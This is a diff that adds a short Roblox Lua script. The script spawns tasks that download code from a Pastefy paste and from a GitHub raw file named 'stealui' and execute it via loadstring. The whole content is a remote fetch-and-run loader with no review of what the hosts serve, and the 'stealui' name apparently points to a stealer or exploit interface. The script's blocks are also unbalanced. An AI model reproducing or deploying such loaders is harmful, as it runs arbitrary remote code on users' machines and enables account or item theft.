@@ -1,0 +1,9 @@
+task.spawn(function()
+
+loadstring(game:HttpGet("https://pastefy.app/lflLtCuk/raw"))()
+
+task.spawn(function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7teenscripts/hahjajah/refs/heads/main/stealui"))()
+
+end) 
